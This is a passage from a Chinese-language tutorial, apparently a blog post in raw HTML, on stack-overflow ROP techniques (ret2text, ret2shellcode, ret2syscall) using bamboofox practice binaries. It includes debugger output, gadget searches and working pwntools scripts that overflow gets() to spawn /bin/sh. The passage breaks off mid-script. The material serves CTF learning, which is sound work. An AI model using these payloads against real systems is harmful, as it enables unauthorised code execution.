Programming)，其主要思想是在<strong>栈缓冲区溢出的基础上(这一条之后不再重复提及)，通过利用程序中已有的小片段(gadgets)来改变某些寄存器或者变量的值，从而改变程序的执行流程。</strong>所谓gadgets就是以ret结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>\n<p>之所以称之为ROP，是因为核心在于利用了指令集中的ret指令，改变了指令流的执行顺序。ROP攻击一般得满足如下条件</p>\n<ul>\n<li>程序存在溢出，并且可以控制返回地址。</li>\n<li>可以找到满足条件的gadgets以及相应gadgets的地址。如果当程序开启了PIE保护，那么就必须想办法泄露gadgets的地址了。</li>\n</ul>\n<p>ret2text即需要我们控制程序执行程序本身已有的的代码(.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码(也就是gadgets)，这就是我们所要说的rop。</p>\n<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。    </p>\n<p><strong>bamboofox中介绍ROP时使用的ret2text的例子：</strong></p>\n<p>1.首先，查看一下程序的保护机制</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2text checksec ret2text</span><br><span class=\"line\">    Arch:     i386<span class=\"number\">-32</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      <span class=\"function\">No <span class=\"title\">PIE</span> <span class=\"params\">(<span class=\"number\">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>\n\n<p>可以看出程序是32位程序，其仅仅开启了栈不可执行保护。</p>\n<p>2.然后，我们在win操作机中使用IDA来查看源代码。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [sp+1Ch] [bp-64h]@1</span></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(_bss_start, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class=\"line\">  gets((<span class=\"keyword\">char</span> *)&amp;v4);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看出程序在主函数中使用了gets函数，显然存在栈溢出漏洞。</p>\n<p>3.此后又发现，在secure函数又发现了存在调用system(“/bin/sh”)的代码，那么如果我们直接控制程序返回至0x0804863A，那么就可以得到系统的shell了。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:080485FD secure          proc near</span><br><span class=\"line\">.text:080485FD</span><br><span class=\"line\">.text:080485FD input           = dword ptr -10h</span><br><span class=\"line\">.text:080485FD secretcode      = dword ptr -0Ch</span><br><span class=\"line\">.text:080485FD</span><br><span class=\"line\">.text:080485FD                 push    ebp</span><br><span class=\"line\">.text:080485FE                 mov     ebp, esp</span><br><span class=\"line\">.text:08048600                 sub     esp, 28h</span><br><span class=\"line\">.text:08048603                 mov     dword ptr [esp], 0 ; timer</span><br><span class=\"line\">.text:0804860A                 call    _time</span><br><span class=\"line\">.text:0804860F                 mov     [esp], eax      ; seed</span><br><span class=\"line\">.text:08048612                 call    _srand</span><br><span class=\"line\">.text:08048617                 call    _rand</span><br><span class=\"line\">.text:0804861C                 mov     [ebp+secretcode], eax</span><br><span class=\"line\">.text:0804861F                 lea     eax, [ebp+input]</span><br><span class=\"line\">.text:08048622                 mov     [esp+4], eax</span><br><span class=\"line\">.text:08048626                 mov     dword ptr [esp], offset unk_8048760</span><br><span class=\"line\">.text:0804862D                 call    ___isoc99_scanf</span><br><span class=\"line\">.text:08048632                 mov     eax, [ebp+input]</span><br><span class=\"line\">.text:08048635                 cmp     eax, [ebp+secretcode]</span><br><span class=\"line\">.text:08048638                 jnz     short locret_8048646</span><br><span class=\"line\">.text:0804863A                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</span><br><span class=\"line\">.text:08048641                 call    _system</span><br></pre></td></tr></table></figure>\n\n<p>4.下面就是我们如何构造payload了，首先需要确定的是我们能够控制的内存地址距离main函数的返回地址的字节数。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:080486A7                 lea     eax, [esp+1Ch]</span><br><span class=\"line\">.text:080486AB                 mov     [esp], eax      ; s</span><br><span class=\"line\">.text:080486AE                 call    _gets</span><br></pre></td></tr></table></figure>\n\n<p>5.可以看到该字符串是通过相对于esp的索引，所以我们需要进行调试，将断点下在call处，查看esp，ebp，如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  b *0x080486AE</span><br><span class=\"line\">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class=\"line\">gef➤  r</span><br><span class=\"line\">There is something amazing here, do you know anything?</span><br><span class=\"line\">Breakpoint 1, 0x080486ae in main () at ret2text.c:24</span><br><span class=\"line\">24      gets(buf);</span><br><span class=\"line\">───────────────────────────────────────────────────────</span><br><span class=\"line\">────────────────[registers ]───────────────────────────</span><br><span class=\"line\">$eax   : 0xffffcd5c  →  0x08048329  →  &quot;__libc_start_main&quot;</span><br><span class=\"line\">$ebx   : 0x00000000</span><br><span class=\"line\">$ecx   : 0xffffffff</span><br><span class=\"line\">$edx   : 0xf7faf870  →  0x00000000</span><br><span class=\"line\">$esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  &quot;__libc_start_main&quot;</span><br><span class=\"line\">$ebp   : 0xffffcdc8  →  0x00000000</span><br><span class=\"line\">$esi   : 0xf7fae000  →  0x001b1db0</span><br><span class=\"line\">$edi   : 0xf7fae000  →  0x001b1db0</span><br><span class=\"line\">$eip   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;</span><br></pre></td></tr></table></figure>\n\n<p>6.可以看到esp为0xffffcd40，ebp为具体的payload如下0xffffcdc8，同时s相对于esp的索引为[esp+0x1c]，所以，s的地址为0xffffcd5c，所以s相对于ebp的偏移为0x6C，所以相对于返回地址的偏移为0x6c+4。</p>\n<p>最后的payload如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2text&#x27;</span>)</span><br><span class=\"line\">target = <span class=\"number\">0x804863a</span></span><br><span class=\"line\">sh.sendline(<span class=\"string\">&#x27;A&#x27;</span> * (<span class=\"number\">0x6c</span>+<span class=\"number\">4</span>) + p32(target))</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><strong>基本ROP</strong>-<strong>ret2shellcode</strong></p>\n<p>ret2shellcode需要我们控制程序执行shellcode代码。而所谓的shellcode指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的shell。<strong>一般来说，shellcode都需要我们自己去填充。这其实是另外一种典型的利用的方法，即此时我们需要自己去填充一些可执行的代码</strong>。</p>\n<p>而在栈溢出的基础上，我们一般都是向栈中写内容，所以要想执行shellcode，需要对应的binary文件没有开启NX保护。</p>\n<p><strong>以bamboofox中的ret2shellcode为例</strong></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2shellcode checksec ret2shellcode</span><br><span class=\"line\">    Arch:     i386<span class=\"number\">-32</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      <span class=\"function\">No <span class=\"title\">PIE</span> <span class=\"params\">(<span class=\"number\">0x8048000</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">    RWX:      Has RWX segments</span></span><br></pre></td></tr></table></figure>\n\n<p>2.我们再win操作机中使用IDA看一下程序。可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到buf2处。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [sp+1Ch] [bp-64h]@1</span></span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No system for you this time !!!&quot;</span>);</span><br><span class=\"line\">  gets((<span class=\"keyword\">char</span> *)&amp;v4);</span><br><span class=\"line\">  <span class=\"built_in\">strncpy</span>(buf2, (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *)&amp;v4, <span class=\"number\">0x64</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;bye bye ~&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3.ida中双击buf2，可知buf2在bss段。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.bss:0804A080   public buf2</span><br><span class=\"line\">.bss:0804A080 ; char buf2[100]</span><br></pre></td></tr></table></figure>\n\n<p>4.这时，我们简单的调试下程序，看看这一个bss段是否可执行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  b main</span><br><span class=\"line\">Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.</span><br><span class=\"line\">gef➤  r</span><br><span class=\"line\">Starting program: /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode</span><br><span class=\"line\">Breakpoint 1, main () at ret2shellcode.c:8</span><br><span class=\"line\">8       setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class=\"line\">────────────[ source:ret2shellcode.c+8 ]────────────</span><br><span class=\"line\">      6  int main(void)</span><br><span class=\"line\">      7  &#123;</span><br><span class=\"line\"> →    8      setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class=\"line\">      9      setvbuf(stdin, 0LL, 1, 0LL);</span><br><span class=\"line\">     10  </span><br><span class=\"line\">────────────────────────────────────[ trace ]────────────────────────</span><br><span class=\"line\">[#0] 0x8048536 → Name: main()</span><br><span class=\"line\">─────────────────────────────────────────────────────</span><br><span class=\"line\">gef➤  vmmap</span><br><span class=\"line\">Start      End        Offset     Perm Path</span><br><span class=\"line\">0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode</span><br><span class=\"line\">0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode</span><br><span class=\"line\">0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode</span><br><span class=\"line\">0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so</span><br><span class=\"line\">0xf7faf000 0xf7fb2000 0x00000000 rwx</span><br><span class=\"line\">0xf7fd3000 0xf7fd5000 0x00000000 rwx</span><br><span class=\"line\">0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]</span><br><span class=\"line\">0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]</span><br><span class=\"line\">0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xf7ffb000 0xf7ffc000 0x00000000 rwx</span><br><span class=\"line\">0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so</span><br><span class=\"line\">0xfffdd000 0xffffe000 0x00000000 rwx [stack]</span><br></pre></td></tr></table></figure>\n\n<p>5.通过vmmap，我们可以看到bss段对应的段具有可执行权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode</span><br></pre></td></tr></table></figure>\n\n<p>6.那么这次我们就控制程序执行shellcode，也就是读入shellcode，然后控制程序执行bss段处的shellcode。其中，相应的偏移计算类似于ret2text中的例子。</p>\n<p>具体的payload如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">sh = process(<span class=\"string\">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class=\"line\">shellcode = asm(shellcraft.sh())</span><br><span class=\"line\">buf2_addr = <span class=\"number\">0x804a080</span></span><br><span class=\"line\">sh.sendline(shellcode.ljust(<span class=\"number\">112</span>, <span class=\"string\">&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><strong>基本ROP</strong>-<strong>ret2syscall</strong></p>\n<p>ret2syscall需要我们控制程序执行系统调用，获取shell。</p>\n<p>这里我们以bamboofox中的ret2syscall为例</p>\n<p>1.首先检测程序开启的保护。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2syscall checksec rop</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n\n<p>2.可以看出，源程序为32位，开启了NX保护。接下来利用IDA来查看源码</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **argv, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> **envp)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> v4; <span class=\"comment\">// [sp+1Ch] [bp-64h]@1</span></span><br><span class=\"line\">setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;This time, no system() and NO SHELLCODE!!!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;What do you plan to do?&quot;</span>);</span><br><span class=\"line\">  gets(&amp;v4);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3.可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得v4相对于ebp的偏移为108。所以我们需要覆盖的返回地址相对于v4的偏移为112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得shell，所以我们利用程序中的gadgets来获得shell，而对应的shell获取则是利用系统调用。</p>\n<p>4.简单地说，只要我们把对应获取shell的系统调用的参数放到对应的寄存器中，那么我们在执行int 0x80就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取shell</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">execve(<span class=\"string\">&quot;/bin/sh&quot;</span>,<span class=\"literal\">NULL</span>,<span class=\"literal\">NULL</span>)</span><br></pre></td></tr></table></figure>\n\n<p>其中，该程序是32位，所以我们需要使得</p>\n<ul>\n<li>系统调用号即eax应该为0xb</li>\n<li>第一个参数即ebx应该指向/bin/sh的地址，其实执行sh的地址也可以</li>\n<li>第二个参数即ecx应该为0</li>\n<li>第三个参数edx应该为0</li>\n</ul>\n<p>而我们如何控制这些寄存器的值 呢？这里就需要使用gadgets。比如说，现在栈顶是10，那么如果此时执行了pop eax，那么现在eax的值就为10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在gadgets最后使用ret来再次控制程序执行流程的原因。具体寻找gadgets的方法，我们可以使用ropgadgets这个工具。</p>\n<p>5.首先，我们来寻找控制eax的gadgets</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class=\"line\">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x080bb196 : pop eax ; ret</span><br><span class=\"line\">0x0807217a : pop eax ; ret 0x80e</span><br><span class=\"line\">0x0804f704 : pop eax ; ret 3</span><br><span class=\"line\">0x0809ddd9 : pop es  ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>\n\n<p>6.可以看到有上述几个都可以控制eax，那我就选取第二个来作为我的gadgets。</p>\n<p>类似的，我们可以得到控制其它寄存器的gadgets</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br><span class=\"line\">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class=\"line\">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class=\"line\">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class=\"line\">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class=\"line\">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class=\"line\">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class=\"line\">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class=\"line\">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class=\"line\">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class=\"line\">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class=\"line\">0x080481c9 : pop ebx ; ret</span><br><span class=\"line\">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class=\"line\">0x08099c87 : pop ebx ; ret 8</span><br><span class=\"line\">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class=\"line\">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class=\"line\">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class=\"line\">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class=\"line\">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class=\"line\">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class=\"line\">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class=\"line\">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure>\n\n<p>这里，我选择</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure>\n\n<p>这个可以直接控制其它三个寄存器。</p>\n<p>7.此外，我们需要获得/bin/sh字符串对应的地址。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2syscall ROPgadget --binary rop  --string &#x27;/bin/sh&#x27;</span><br><span class=\"line\">Strings information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure>\n\n<p>8.可以找到对应的地址，此外，还有int 0x80的地址，如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  ret2syscall ROPgadget --binary rop  --only &#x27;int&#x27;                 </span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x08049421 : int 0x80</span><br><span class=\"line\">0x080938fe : int 0xbb</span><br><span class=\"line\">0x080869b5 : int 0xf6</span><br><span class=\"line\">0x0807b4d4 : int 0xfc</span><br><span class=\"line\">Unique gadgets found: 4</span><br></pre></td></tr></table></figure>\n\n<p>同时，也找到对应的地址了。</p>\n<p>9.下面就是对应的payload,其中0xb为execve对应的系统调用号。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">##!/usr/bin/env python</span></span><br><span class=\"line\"><span 